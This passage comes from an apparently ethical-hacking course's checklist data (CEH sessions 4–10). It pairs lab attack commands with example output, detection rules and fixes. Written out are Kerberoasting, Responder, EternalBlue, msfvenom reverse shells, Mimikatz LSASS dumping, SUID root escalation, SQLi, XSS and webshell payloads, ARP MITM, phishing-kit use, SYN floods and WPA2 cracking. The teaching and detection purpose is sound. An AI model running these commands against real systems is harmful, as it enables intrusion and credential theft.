      {'id':'c4','active':True,'name':'Kerberoasting','cmd':'impacket-GetUserSPNs ceh.lab/user -request -dc-ip dc.ceh.lab',
       'example':'ServicePrincipalName  Name       \nMSSQL/dc.ceh.lab      svc_sql\n$krb5tgs$23$*svc_sql*... (hash for offline crack, mode 13100)',
       'collect':['<strong>SPN accounts</strong> and their <strong>TGS hashes</strong>','Feed the hashes to <span class="mono">hashcat -m 13100</span>'],
       'why':'any domain user can request these tickets — crack one offline and you own a service account, often with high privilege. A top exam and real-world technique.',
       'ph':'SPN accounts / TGS hashes captured / cracked?…'},
      {'id':'c5','active':True,'name':'LLMNR / NBT-NS poisoning','cmd':'sudo responder -I eth0 -wv   (lab segment only)',
       'example':'[*] Poisoned answer sent to WIN10-TGT01 for name \\\\fileshare\n[SMB] NTLMv2-SSP Hash captured: m.said::CEH:...\nSaved to Responder logs → crack with -m 5600',
       'collect':['<strong>NetNTLMv2 hashes</strong> captured from broadcast name lookups','Which hosts were poisoned and which users'],
       'why':'LLMNR/NBT-NS are still on by default in 2026 — poisoning silently harvests hashes that feed C2, closing the loop back to cracking.',
       'ph':'Hashes captured via poisoning + hosts/users…'},
    ]},
    {'name': 'D · The deliverable — this is what you submit', 'items': [
      {'t':'free','id':'d1','label':'D1 · Access plan','hint':'Per host, the chosen way in — the literal input to Session 5 exploitation.',
       'ph':'host | CVE + public exploit? | creds obtained + how | chosen way in\ndc.ceh.lab | Ghostcat CVE-2020-1938 (PoC yes) | svc_backup:Summer2026! (cracked NTLM) | PtH as svc_backup, else Ghostcat\nWIN10-TGT01 | — | m.said NetNTLMv2 (Responder, cracking) | spray reuse'},
      {'t':'free','id':'d2','label':'D2 · Detection note (the SOC flip)','hint':'What each attack wrote to the auth logs — the tier-1→tier-2 SOC skill.',
       'ph':'Spray → many 4625 (0xC000006A) from one source in a short window\nKerberoast → 4769 with RC4 (0x17) enc type\nResponder → LLMNR/NBT-NS traffic, logons from an unexpected host'},
      {'t':'free','id':'d3','label':'D3 · Scope statement','hint':'Confirm this stayed on the authorised lab.','ph':'All vulnerability scanning and credential attacks ran only against the authorised ceh.lab lab hosts on the host-only network. No public/bug-bounty target was touched. Lockout policy was respected during spraying.'},
    ]},
  ],
}

SESSIONS['s5-foothold'] = {
  'num': '05', 'gate': 'a1', 'short': 'Exploitation &amp; Foothold',
  'title': 'Team Exploitation &amp; Foothold Report',
  'report_title': 'CEH Session 5 — Team Exploitation & Foothold Report',
  'desc': 'CEH Diploma Session 5 team deliverable — an interactive exploitation checklist that turns the Session 4 access plan into shells, records the user context landed as per host, and captures a reverse-shell detection rule. Saved in the browser, exported to HTML or PDF.',
  'lede': 'Turn Session 4&rsquo;s access plan into <strong>shells</strong> on the <strong>authorised lab</strong>. Fire each chosen way in, record the <strong>user context you landed as</strong>, then detect your own reverse shell. Tick each step, paste evidence, click <em>example</em> for good output. Saves in <strong>this browser</strong>; export to HTML or PDF.',
  'sections': [
    {'name': 'A · Setup &amp; scope — do this first', 'items': [
      {'id':'a1','name':'Authorization check','cmd':'confirm you are on the authorised host-only lab',
       'exlabel':'Example — what authorises firing an exploit',
       'example':'Authorised targets:  Metasploitable2, WIN7-TGT01, WIN10-TGT01,\n                     ceh.lab DC  (host-only lab network only)\nAllowed:             exploit, catch shells, buffer overflow, cred-based access\nNever:               any host you were not given — a reverse shell is not research',
       'collect':['The exact <strong>authorised lab hosts</strong>','That a caught shell / crashed service is <strong>lab-only</strong>','A <span class="mono">pre-s5</span> snapshot on every target'],
       'why':'exploitation runs code and can crash a box — the authorisation and the snapshots are what make it a lab exercise instead of an incident.',
       'ph':'Authorised lab hosts: … | snapshots taken: yes | NOT any external host'},
    ]},
    {'name': 'B · Exploitation — CVE to code execution', 'items': [
      {'id':'b1','active':True,'name':'Manual exploit','cmd':'nc 192.168.56.102 21  (vsftpd 2.3.4 backdoor, by hand)',
       'example':'USER hacker:)  ->  backdoor listens on 6200\nnc 192.168.56.102 6200\nid  ->  uid=0(root)',
       'collect':['The service+version you exploited and <strong>how the exploit works</strong> (step 3)','The shell you got and the <strong>user context</strong> (root)'],
       'why':'doing it by hand proves you understand the exploit — the framework never reads it for you.',
       'ph':'Host | service+version | mechanism | shell + landed as…'},
      {'id':'b2','active':True,'name':'Framework exploit','cmd':'use exploit/unix/ftp/vsftpd_234_backdoor ; set RHOSTS ; exploit',
       'example':'[+] Backdoor service has been spawned...\n[*] Command shell session 1 opened\nid  ->  uid=0(root)',
       'collect':['The module path used and the <strong>session</strong> opened','One line: what the framework automated vs what it did not (step 3)'],
       'why':'the framework is speed; naming what it hides is the understanding the exam tests.',
       'ph':'Module path | session opened? | what it automated…'},
      {'id':'b3','active':True,'name':'EternalBlue -> SYSTEM','cmd':'use exploit/windows/smb/ms17_010_eternalblue ; check ; exploit',
       'example':'[+] The target is vulnerable.\n[+] =-=-=-WIN-=-=-=\nmeterpreter > getuid  ->  Server username: SYSTEM',
       'collect':['The <strong>check</strong> result, then the <strong>session</strong> and <span class="mono">getuid</span>','Why you landed as SYSTEM with no escalation (SMB runs as SYSTEM)'],
       'why':'the flagship CVE-to-impact demo, and your S4 MS17-010 match fired. Save the Sysmon/Security logs for section D2.',
       'ph':'check result | getuid | evidence saved for detection…'},
    ]},
    {'name': 'C · Shells, payloads &amp; the overflow', 'items': [
      {'id':'c1','active':True,'name':'Payload + handler','cmd':'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=.101 LPORT=443 -f exe -o rev.exe',
       'example':'multi/handler: Started reverse TCP handler on .101:443\n[*] Meterpreter session opened  (target -> you)\nStaged (/) needs the handler UP first',
       'collect':['The payload built (staged vs stageless) and the <strong>caught session</strong>','The Sysmon 1/3 evidence the callback generated (for D2)'],
       'why':'generate + catch is the pattern behind every non-module exploit, and it produces the reverse-shell evidence you will detect.',
       'ph':'Payload | staged/stageless | caught? | evidence saved…'},
      {'id':'c2','active':True,'name':'Credential-based access','cmd':'impacket-psexec ceh.lab/m.said@192.168.56.20   (an S4 credential, no exploit)',
       'example':'[*] Creating service ... \nC:\\> whoami  ->  nt authority\\system\nevil-winrm -i .20 -u administrator -H <hash>  (pass-the-hash)',
       'collect':['Which <strong>S4 credential</strong> got you a shell, and on which host','The shell/context — no CVE, no crash'],
       'why':'a credential is an exploit that never crashes anything and rarely trips an IDS — the quietest foothold, and the S6 bridge.',
       'ph':'Credential used | host | tool | landed as…'},
      {'id':'c3','active':True,'name':'Buffer overflow (guided)','cmd':'fuzz vulnserver -> pattern_offset -> control EIP -> bad chars -> JMP ESP -> shellcode',
       'example':'Exact match at offset 2003\nbad chars: 00 0a 0d\n!mona jmp -r esp  ->  0x625011AF\nnc -lvnp 443  ->  shell',
       'collect':['The <strong>offset</strong>, the <strong>bad-character list</strong>, and the <strong>JMP ESP</strong> address','The shell you landed (even with saved-state hints)'],
       'why':'the overflow is what RCE means underneath. Naming the six milestones is the objective, not artistry.',
       'ph':'offset | bad chars | JMP ESP addr | shell landed…'},
    ]},
    {'name': 'D · The deliverable — this is what you submit', 'items': [
      {'t':'free','id':'d1','label':'D1 · Foothold record','hint':'Per host, how you got in and the user context you landed as — the literal input to Session 6.',
       'ph':'host | got in via | payload/shell | LANDED AS | proof\nWIN7-TGT01 | EternalBlue (MS17-010) | staged meterpreter | SYSTEM | getuid\nMETASPLOITABLE2 | vsftpd 2.3.4 backdoor | bind :6200 | root | id\nDC | credential m.said (S4 spray) | psexec | SYSTEM | whoami\nWIN10-TGT01 | BOF vulnserver | shell_reverse_tcp | low-priv | whoami'},
      {'t':'free','id':'d2','label':'D2 · Detection note (the SOC flip)','hint':'The reverse-shell rule and what each attack wrote to the host/network logs.','ph':'Rule: server/service parent (services.exe/w3wp.exe) spawns cmd.exe/powershell (4688/Sysmon1)\n      AND that shell makes an outbound connection (Sysmon3)  -> reverse shell\nEternalBlue -> IDS ET EXPLOIT MS17-010 ; meterpreter stager signature\nOne false-positive source it survives: admin opening PowerShell (no server parent + no egress)'},
      {'t':'free','id':'d3','label':'D3 · Scope statement','hint':'Confirm this stayed on the authorised lab.','ph':'All exploitation, payload delivery and the buffer overflow ran only against the authorised host-only lab VMs. No exploit or shell touched any host outside the lab network. Snapshots were taken before firing.'},
    ]},
  ],
}

SESSIONS['s6-engagement'] = {
  'num': '06', 'gate': 'a1', 'short': 'Privesc &amp; Engagement',
  'title': 'Team Privesc &amp; Engagement Report',
  'report_title': 'CEH Session 6 — Team Privesc & Engagement Report',
  'desc': 'CEH Diploma Session 6 team deliverable — turn each low-privilege foothold into root/SYSTEM, loot the host, run the full capstone chain, and write the engagement report. Saved in the browser, exported to HTML or PDF.',
  'lede': 'Turn every low-priv foothold from Session 5 into <strong>root and SYSTEM</strong> on the <strong>authorised lab</strong>, loot it, and run the whole chain on a capstone. Record each escalation with proof, then write the engagement report. Saves in <strong>this browser</strong>; export to HTML or PDF.',
  'sections': [
    {'name': 'A · Setup &amp; scope', 'items': [
      {'id':'a1','name':'Authorization check','cmd':'confirm you are on the authorised host-only lab / capstone VMs',
       'exlabel':'Example — what authorises escalation',
       'example':'Authorised: your own low-priv footholds, WIN10, ceh.lab DC,\n           DoubleTrouble + Blackpearl (host-only, snapshotted)\nAllowed:    enumerate, escalate, dump LSASS, run the capstone\nNever:      any host you were not given',
       'collect':['The authorised hosts and capstone VMs','That LSASS dumping / escalation is lab-only','A pre-s6 snapshot on every target'],
       'why':'escalation runs code as root/SYSTEM and dumps credentials — the authorisation and snapshots make it a lab exercise, not an incident.',
       'ph':'Authorised hosts + capstones: … | snapshots: yes'},
    ]},
    {'name': 'B · Linux privilege escalation', 'items': [
      {'id':'b1','active':True,'name':'Enumerate (linPEAS + manual)','cmd':'id ; sudo -l ; find / -perm -4000 2>/dev/null ; ./linpeas.sh',
       'example':'/usr/bin/find   <-- SUID (GTFOBins)\n(ALL) NOPASSWD: /usr/bin/less\n* * * * * root /opt/backup.sh   (writable)',
       'collect':['The SUID list, sudo rights, and writable root-run scripts','Which of them appear on GTFOBins'],
       'why':'enumeration finds the one misconfiguration; the exploit is a one-liner once you have it.',
       'ph':'SUID / sudo / cron findings + which are GTFOBins…'},
      {'id':'b2','active':True,'name':'Escalate to root','cmd':'find . -exec /bin/sh -p \; -quit   # or sudo break-out / writable cron',
       'example':'id -> uid=1000 euid=0(root)\nwhoami -> root',
       'collect':['The exact abuse command and the vector it used','Proof: id / cat /root/root.txt'],
       'why':'this is the milestone — a low-priv Linux shell is now root, by a misconfiguration you enumerated.',
       'ph':'Vector used | command | proof (euid=0)…'},
    ]},
    {'name': 'C · Windows privilege escalation &amp; loot', 'items': [
      {'id':'c1','active':True,'name':'Escalate to SYSTEM','cmd':'winPEAS ; whoami /priv ; PrintSpoofer.exe -i -c cmd   # or a weak service',
       'example':'SeImpersonatePrivilege  Enabled\nPrintSpoofer -> whoami -> nt authority\\system',
       'collect':['The route (token/potato, weak service, or AlwaysInstallElevated)','Proof: whoami = SYSTEM'],
       'why':'a service account with SeImpersonate is SYSTEM with an extra step — the most common Windows privesc.',
       'ph':'Route | command | whoami=SYSTEM…'},
      {'id':'c2','active':True,'name':'Dump LSASS (Mimikatz) + reuse','cmd':'privilege::debug ; sekurlsa::logonpasswords',
       'example':'* Username : m.said\n* NTLM     : e19ccf75...\n* Password : Autumn2025!\n-> nxc smb <next-host> -u m.said -H <hash>  (Pwn3d!)',
       'collect':['Credentials dumped (user + hash/plaintext)','A credential reused on a second host (lateral movement)'],
       'why':'SYSTEM on one box is credentials for the network. This also generates the Sysmon 10 evidence for the detection rule.',
       'ph':'Creds dumped + which reused on which host…'},
    ]},
    {'name': 'D · The deliverable — this is what you submit', 'items': [
      {'t':'free','id':'d1','label':'D1 · Capstone chain','hint':'The full recon->shell->root chain on DoubleTrouble / Blackpearl.',
       'ph':'phase | what you did | result\nrecon  | nmap -sC -sV -p- ; gobuster | web + /secret\nway in | stegseek image -> creds -> upload shell | www-data\nprivesc| linpeas -> SUID php (GTFOBins) | root'},
      {'t':'free','id':'d2','label':'D2 · Detection note (the SOC flip)','hint':'The privesc detection rule + what each escalation logged.','ph':'Rule: Sysmon 10 process opening lsass.exe with dump GrantedAccess, minus wininit/MsMpEng -> credential dumping\nToken abuse -> 4672 (special privileges) ; service -> 7045 ; Linux SUID shell -> auditd execve euid 0\nOne false-positive it survives: a backup agent reading files (not LSASS with a dump mask)'},
      {'t':'free','id':'d3','label':'D3 · Findings &amp; remediation','hint':'Per finding: severity + fix — the engagement report core.','ph':'SUID find (High) -> chmod -s ; remove shell-capable SUIDs\nSeImpersonate service (High) -> least-privilege service accounts, patch\nWritable cron (High) -> fix script ownership/permissions'},
    ]},
  ],
}

SESSIONS['s7-malware'] = {
  'num': '07', 'gate': 'a1', 'short': 'Malware Triage',
  'title': 'Team Malware Triage Report',
  'report_title': 'CEH Session 7 — Team Malware Triage Report',
  'desc': 'CEH Diploma Session 7 team deliverable — build a controlled sample, analyse it static and dynamic in isolation, map it to ATT&CK, and ship the YARA + Sigma rules that catch it. Saved in the browser, exported to HTML or PDF.',
  'lede': 'Take one controlled sample from <strong>build</strong> to <strong>detection</strong>: static analysis (hash, strings, imports), dynamic analysis in an <strong>isolated sandbox</strong>, ATT&amp;CK mapping, then the <strong>YARA + Sigma</strong> rules and the incident report. Saves in <strong>this browser</strong>; export to HTML or PDF.',
  'sections': [
    {'name': 'A · Setup &amp; isolation', 'items': [
      {'id':'a1','name':'Isolation check','cmd':'confirm the analysis VM is snapshotted and cannot reach the real network',
       'exlabel':'Example — what makes detonation safe',
       'example':'Snapshot: pre-detonation clean state taken\nNetwork:  host-only / INetSim — ping 8.8.8.8 FAILS\nSharing:  no shared folders / clipboard to host\nSample:   lab-built trojan, host-only network only',
       'collect':['That a clean snapshot exists','That the VM cannot reach the real internet / your host','That the sample is lab-only and stays on the isolated net'],
       'why':'dynamic analysis executes live malware — the snapshot and network isolation are what make it a lab exercise, not an incident.',
       'ph':'Snapshot: yes | 8.8.8.8 unreachable: yes | sample: lab-built…'},
    ]},
    {'name': 'B · Static analysis (no execution)', 'items': [
      {'id':'b1','active':True,'name':'Identity + reputation','cmd':'sha256sum sample.exe   # then search the hash on VirusTotal',
       'example':'sha256: 9f2c...ab   VT: 58/72 (Meterpreter)\n-> known-bad, high confidence',
       'collect':['The SHA-256 hash','The VirusTotal ratio / family label (or "unknown")'],
       'why':'the hash is the sample identity and an IOC; reputation often ends triage in seconds.',
       'ph':'sha256 + VT ratio/label…'},
      {'id':'b2','active':True,'name':'Strings + PE imports','cmd':'strings -n 8 sample.exe | grep -Ei "http|[0-9.]{7,}" ; pefile imports',
       'example':'strings -> 192.168.56.101 ; ws2_32.dll import\n-> network capability + C2 IOC',
       'collect':['Distinctive strings (C2 URL/IP, commands)','Suspicious import clusters (sockets/crypto/injection)'],
       'why':'strings reveal intent and imports reveal capability — the raw material for the YARA rule, with zero execution risk.',
       'ph':'Key strings + import clusters…'},
    ]},
    {'name': 'C · Dynamic analysis (detonate in the chamber)', 'items': [
      {'id':'c1','active':True,'name':'Detonate &amp; watch the C2','cmd':'arm ss/TCPView -> run sample -> observe outbound connection',
       'example':'invoice_2026.exe -> 192.168.56.101:443 ESTABLISHED\nhandler: meterpreter session opened',
       'collect':['The C2 IP/port the sample connected to','Proof of control (session opened / process tree)'],
       'why':'behaviour is the ground truth packing cannot hide — it confirms the capability static analysis predicted.',
       'ph':'C2 endpoint + confirmed behaviour…'},
      {'id':'c2','active':True,'name':'Persistence &amp; drops','cmd':'ProcMon: RegSetValue on Run key ; dropped files in %TEMP%',
       'example':'HKCU\\...\\Run = C:\\Users\\...\\update.exe (Sysmon 13)\ndropped: %TEMP%\\stage2.bin',
       'collect':['Any persistence written (Run key / task / service)','Any dropped second-stage files'],
       'why':'persistence and drops are durable host IOCs and the Sysmon 13/7045 evidence your Sigma rule keys on.',
       'ph':'Persistence + drops observed…'},
    ]},
    {'name': 'D · The deliverable — this is what you submit', 'items': [
      {'t':'free','id':'d1','label':'D1 · IOCs by durability','hint':'Host / network / behaviour indicators, ranked on the Pyramid of Pain.',
       'ph':'host:    sha256 9f2c...ab ; invoice_2026.exe\nnetwork: 192.168.56.101:443 (C2)\nttp:     unsigned exe in user path -> outbound 443 + Run-key persistence'},
      {'t':'free','id':'d2','label':'D2 · Detections (YARA + Sigma)','hint':'The two rules that catch it — file content + log behaviour, ATT&CK-tagged.','ph':'YARA  Session7_Lab_Trojan: MZ@0 + ws2_32 + "192.168.56.101" -> matches sample, not benign (t1071.001)\nSigma outbound 80/443 from Image under C:\\Users\\ | Temp | ProgramData (Sysmon 3) -> t1071.001\nOne false positive it survives: a signed updater in Program Files (not a user-writable path)'},
      {'t':'free','id':'d3','label':'D3 · Triage verdict + ATT&amp;CK','hint':'Verdict, impact, and the lifecycle mapped to techniques — the report core.','ph':'Verdict: MALICIOUS — Windows trojan / Meterpreter RAT (high confidence)\nExecution T1204/T1059 -> C2 T1071.001 -> (Persistence T1547.001)\nContainment: isolate host, block C2 at proxy, reset exposed creds ; harden: block internet macros, egress filtering'},
    ]},
  ],
}

SESSIONS['s8-webapp'] = {
  'num': '08', 'gate': 'a1', 'short': 'Web App Findings',
  'title': 'Team Web-App Finding Report',
  'report_title': 'CEH Session 8 — Team Web-App Finding Report',
  'desc': 'CEH Diploma Session 8 team deliverable — assess a web app on the authorised lab, prove each injection flaw, extract with SQLi, and write the prioritised finding report with detection rules. Saved in the browser, exported to HTML or PDF.',
  'lede': 'Assess the <strong>authorised lab web app</strong> end to end: intercept with Burp, prove <strong>XSS / upload / SQLi</strong>, extract the database, then ship a prioritised <strong>finding report</strong> with a detection rule. Saves in <strong>this browser</strong>; export to HTML or PDF.',
  'sections': [
    {'name': 'A · Setup &amp; scope', 'items': [
      {'id':'a1','name':'Authorization check','cmd':'confirm you are testing the authorised lab app (DVWA / Juice Shop) only',
       'exlabel':'Example — what authorises web testing',
       'example':'Authorised: your own DVWA / Juice Shop on the lab network\nAllowed:    intercept, enumerate, inject, upload a shell, dump the DB\nNever:      any live third-party site — web attacks are logged & a crime',
       'collect':['The authorised app + URL','That injection / upload / SQLi is lab-only','Burp proxy + DVWA login working'],
       'why':'every payload in this session is illegal against a site you do not own; the authorised lab is what makes it a training exercise.',
       'ph':'Authorised app + URL … | Burp intercepting: yes'},
    ]},
    {'name': 'B · Injection findings (browser + server)', 'items': [
      {'id':'b1','active':True,'name':'XSS + file upload','cmd':'prove stored XSS, then upload a webshell and run a command',
       'example':"stored: <script>alert(document.cookie)</script> fires for all\nupload: shell.php -> curl .../shell.php?c=id -> uid=33(www-data)",
       'collect':['The stored-XSS payload + where it fires','The upload bypass used + proof of RCE (id/whoami)'],
       'why':'XSS steals sessions for every visitor; a stored, executable upload is a direct server foothold.',
       'ph':'XSS payload + upload bypass + RCE proof…'},
      {'id':'b2','active':True,'name':'Command injection / IDOR','cmd':'; id in a command field ; change ?id=123 -> 124',
       'example':'cmdi: 8.8.8.8 ; id -> uid=33(www-data)\nidor: /profile?id=1338 returns another user',
       'collect':['The command-injection payload + output','The IDOR endpoint + the data exposed'],
       'why':'command injection is direct OS execution; IDOR is broken access control (OWASP #1) with no payload at all.',
       'ph':'cmdi payload + IDOR endpoint…'},
    ]},
    {'name': 'C · SQL injection &amp; extraction', 'items': [
      {'id':'c1','active':True,'name':'Auth bypass + UNION dump (manual)','cmd':"' OR '1'='1' -- ; ' UNION SELECT user,password FROM users -- ",
       'example':"' ORDER BY 2 -> 2 cols\n' UNION SELECT user,password FROM users -- -\nadmin : 5f4dcc3b5aa765d61d8327deb882cf99 (md5 password)",
       'collect':['The column count + the dump payload','The credentials extracted (user + hash)'],
       'why':'manual SQLi proves you understand what sqlmap does; the dumped hashes feed Session 4 cracking.',
       'ph':'Columns | dump payload | creds extracted…'},
      {'id':'c2','active':True,'name':'sqlmap + verify','cmd':'sqlmap -r request.txt --batch -D <db> -T users --dump',
       'example':'sqlmap reproduces the users dump; blind target extracted via --technique=BT',
       'collect':['That sqlmap matched the manual dump','The blind case sqlmap extracted (no visible output)'],
       'why':'sqlmap confirms the visible case and conquers the blind one you cannot finish by hand — verified against your own result.',
       'ph':'sqlmap result vs manual + blind extraction…'},
    ]},
    {'name': 'D · The deliverable — this is what you submit', 'items': [
      {'t':'free','id':'d1','label':'D1 · Prioritised findings','hint':'Each vuln: OWASP category + severity + endpoint + the ONE fix, worst first.','ph':'F1 SQLi (A03, Critical, /sqli?id) -> parameterised queries\nF2 Upload->RCE (A05, High, /upload) -> server-side allow-list, store outside webroot\nF3 Stored XSS (A03, High, /guestbook) -> output encoding + CSP\nF4 IDOR (A01, High, /profile?id) -> per-object authorization'},
      {'t':'free','id':'d2','label':'D2 · Detection rule (the SOC flip)','hint':'An access-log/WAF rule for SQLi or XSS, validated on your own traffic.','ph':"Rule: cs-uri-query contains UNION SELECT / information_schema / ' OR '1'='1 / SLEEP( -> SQLi attempt (t1190)\nValidated against: the requests my manual + sqlmap runs generated\nAlso: 404-spike per IP -> enumeration ; <script>/onerror in a param -> XSS"},
      {'t':'free','id':'d3','label':'D3 · Evidence &amp; impact','hint':'Per finding: the request + result and what an attacker gains.','ph':'SQLi: request + dumped users row -> full DB read, cred theft\nUpload: request + id output -> RCE as www-data -> foothold (S5/S6)\nIDOR: request for id=1338 -> another user record -> data exposure'},
    ]},
  ],
}

SESSIONS['s9-network'] = {
  'num': '09', 'gate': 'a1', 'short': 'Network & Human',
  'title': 'Team Network & Human Assessment',
  'report_title': 'CEH Session 9 — Team Network & Human Assessment Report',
  'desc': 'CEH Diploma Session 9 team deliverable — assess the four surfaces around the app (network, session, human, availability) on the authorised lab, prove each attack, and ship a prioritised assessment with detections. Saved in the browser, exported to HTML or PDF.',
  'lede': 'Assess the four surfaces around the app on the <strong>authorised lab</strong>: MITM the <strong>wire</strong>, hijack the <strong>session</strong>, phish the <strong>human</strong> (ethics-gated), and flood the <strong>service</strong> — then ship a prioritised assessment with detections. Saves in <strong>this browser</strong>; export to HTML or PDF.',
  'sections': [
    {'name': 'A · Setup &amp; ethics gate', 'items': [
      {'id':'a1','name':'Authorization &amp; isolation check','cmd':'confirm host-only lab + consenting test accounts; MITM/phishing/DoS are lab-only',
       'exlabel':'Example — what authorises these attacks',
       'example':'Authorised: your own host-only lab VMs + consenting test accounts\nAllowed:    ARP MITM, cookie replay, SET on a LAB page, SYN/Slowloris on a lab VM\nNever:      any real person, brand, or network — these are crimes off-lab',
       'collect':['The authorised lab hosts + consenting accounts','That MITM / phishing / DoS are isolated-lab only','ARP spoof will be stopped cleanly'],
       'why':'MITM, phishing, and DoS against systems you do not own are serious crimes; the isolated lab + consent is what makes this training.',
       'ph':'Authorised lab + consent … | isolation confirmed'},
    ]},
    {'name': 'B · Network &amp; session', 'items': [
      {'id':'b1','active':True,'name':'ARP MITM + sniff','cmd':'bettercap: arp.spoof on ; net.sniff on -> capture a cleartext login',
       'example':'gateway 192.168.56.1 -> attacker MAC (poisoned)\nHTTP POST captured: user=admin&pass=Autumn2025!',
       'collect':['The MITM position achieved (poisoned mapping)','A cleartext credential/token captured'],
       'why':'the MITM reads everything in transit on cleartext — and leaves an ARP anomaly the SOC can detect.',
       'ph':'Poisoned mapping + captured credential…'},
      {'id':'b2','active':True,'name':'Steal &amp; replay a session','cmd':"curl -b 'PHPSESSID=<stolen>' http://app/account",
       'example':'replayed token -> victim account served, no password\nMFA-on-login did nothing (session already authenticated)',
       'collect':['The token stolen + replayed (takeover shown)','Why login MFA did not stop it'],
       'why':'a session token is a bearer credential; this is the core session-hijack lesson and generates the two-IP detection.',
       'ph':'Token replayed + takeover proof…'},
    ]},
    {'name': 'C · Human &amp; availability', 'items': [
      {'id':'c1','active':True,'name':'Phishing (SET, ethics-gated)','cmd':'setoolkit -> Credential Harvester -> Site Cloner (LAB page only)',
       'example':'cloned lab login served from Kali; test victim submitted creds\nSET logged: user=test pass=Test123!  (a consenting lab account)',
       'collect':['The lever(s) used + the cloned page','The indicators + controls (MFA, reporting, DMARC)'],
       'why':'the technical half of phishing is trivial — so the defence is MFA + awareness; running it (on a lab account) makes that concrete.',
       'ph':'Lever + indicators + MFA/awareness controls…'},
      {'id':'c2','active':True,'name':'DoS + mitigation','cmd':'hping3 -S --flood ; then sysctl tcp_syncookies=1 ; slowhttptest ; proxy timeouts',
       'example':'SYN flood -> SYN_RECV pile-up -> syncookies restores service\nSlowloris -> workers busy -> reverse-proxy timeouts restore it',
       'collect':['The DoS class run + the resource exhausted','The class-matched mitigation + recovery'],
       'why':'each DoS class exhausts a different resource and needs a different fix — proving that is the point, not the takedown.',
       'ph':'DoS class + mitigation + recovery…'},
    ]},
    {'name': 'D · The deliverable — this is what you submit', 'items': [
      {'t':'free','id':'d1','label':'D1 · Four-surface findings','hint':'One line per surface: finding + the fix, prioritised.','ph':'NETWORK  MITM possible (no DAI); HTTP creds sniffable -> TLS/HSTS + DAI\nSESSION  cookie not HttpOnly/Secure, no expiry -> flags + expiry + regenerate\nHUMAN    phish click, no MFA -> MFA + awareness + reporting + DMARC\nAVAIL.   SYN flood succeeded (no syncookies) -> syncookies + proxy timeouts'},
      {'t':'free','id':'d2','label':'D2 · Detections (the SOC flip)','hint':'A rule per surface, validated on your own traffic.','ph':'MITM   -> arpwatch/Suricata: gateway IP maps to a new MAC\nHIJACK -> one session_id from two src_ip within 5m (t1539)\nPHISH  -> young look-alike domain in mail + new-geo login + user report\nDoS    -> ss -tan state syn-recv | wc -l threshold ; Gbps NetFlow surge'},
      {'t':'free','id':'d3','label':'D3 · Prioritised remediation','hint':'Highest-leverage first; call out the single best control.','ph':'1 MFA (kills phished pw + limits stolen-token value) — very high\n2 TLS + Secure/HttpOnly/SameSite (kills sniffing + XSS theft + CSRF) — high\n3 DAI / port-security (kills ARP MITM) — medium\n4 SYN cookies + proxy timeouts (kills SYN/Slowloris) — medium'},
    ]},
  ],
}

SESSIONS['s10-capstone'] = {
  'num': '10', 'gate': 'a1', 'short': 'Capstone',
  'title': 'Team Defence-in-Depth Capstone',
  'report_title': 'CEH Session 10 — Team Defence-in-Depth Capstone',
  'desc': 'CEH Diploma FINAL deliverable — assess the lab across every layer (evasion, wireless, cloud/IoT, crypto + all prior sessions), frame findings as a defence-in-depth chain, and ship the capstone report. Saved in the browser, exported to HTML or PDF.',
  'lede': 'The diploma capstone. Assess the <strong>authorised lab</strong> across every layer &mdash; evade the defences, break Wi-Fi, sweep cloud/IoT, audit crypto &mdash; then tie all ten sessions into a <strong>defence-in-depth</strong> report. Saves in <strong>this browser</strong>; export to HTML or PDF.',
  'sections': [
    {'name': 'A · Setup &amp; scope', 'items': [
      {'id':'a1','name':'Authorization check','cmd':'confirm lab hosts, your own AP/adapter, and your own cloud/devices only',
       'exlabel':'Example — what authorises the final sweep',
       'example':'Authorised: lab IDS host, YOUR test AP + adapter, YOUR test bucket/device\nAllowed:    evasion scans, WPA2 crack (own AP), bucket/creds check (own), crypto audit\nNever:      any other network, Wi-Fi, cloud, or device — all crimes off-lab',
       'collect':['The authorised lab + your own AP/cloud/devices','That evasion/wireless/cloud attacks are owned-only'],
       'why':'evasion, wireless, cloud, and device attacks against anything you do not own are serious crimes; owned/lab scope is what makes this training.',
       'ph':'Authorised lab + own AP/cloud/devices …'},
    ]},
    {'name': 'B · Perimeter &amp; wireless', 'items': [
      {'id':'b1','active':True,'name':'Evade the IDS','cmd':'nmap -f --source-port 53 -D RND:10 -T2 target ; then harden + re-detect',
       'example':'plain scan -> Suricata alerts fire\nfrag+decoy+slow -> alerts drop ; full reassembly -> re-detected',
       'collect':['Which evasion beat which detection method','What re-caught it (reassembly/anomaly)'],
       'why':'evasion beats a naive sensor, not a layered well-tuned one — the defence-in-depth lesson in miniature.',
       'ph':'Evasion used + what re-detected it…'},
      {'id':'b2','active':True,'name':'Crack WPA2 (own AP)','cmd':'airodump + aireplay deauth -> capture ; aircrack -w rockyou',
       'example':"WPA handshake captured -> aircrack: KEY FOUND [weak-pass]\nlong random passphrase / WPA3 -> won't crack",
       'collect':['The handshake captured + cracked (own AP)','The fix: long passphrase / WPA3'],
       'why':'WPA2 security is entirely passphrase strength (offline crack, no lockout); WPA3 removes the crackable handshake.',
       'ph':'Handshake cracked + the fix…'},
    ]},
    {'name': 'C · Emerging surface &amp; crypto', 'items': [
      {'id':'c1','active':True,'name':'Cloud/IoT config findings','cmd':'aws s3 ls --no-sign-request ; try default creds ; check IAM wildcards',
       'example':'public bucket lists anonymously -> data exposure\ndevice accepts admin/admin ; IAM policy Action:* -> over-priv',
       'collect':['The open bucket / default-cred / over-priv finding','The one-line config fix for each'],
       'why':'the modern surface fails on configuration, not exploits — found by checking, fixed by settings.',
       'ph':'Cloud/IoT findings + fixes…'},
      {'id':'c2','active':True,'name':'Crypto audit','cmd':'nmap --script ssl-enum-ciphers -p443 target ; openssl sign/verify',
       'example':'TLS 1.0 + RC4 supported -> deprecated (downgrade risk)\nunsalted MD5 password hashes -> migrate to bcrypt/argon2',
       'collect':['The weak protocol/cipher/hash found','The modern replacement recommended'],
       'why':'crypto fails in deployment, not the math — old algorithms, weak keys, unverified signatures are the findings.',
       'ph':'Weak crypto found + modern fix…'},
    ]},
    {'name': 'D · The capstone deliverable — this is what you submit', 'items': [
      {'t':'free','id':'d1','label':'D1 · Attack narrative (chains ≥3 sessions)','hint':'The story of how an attacker moves through the environment.','ph':'recon (S3) exposed /admin -> SQLi foothold (S8) -> privesc to SYSTEM (S6)\n-> LSASS dump (S7) -> lateral via reused creds (S4/S9) -> data to a public bucket (S10)'},
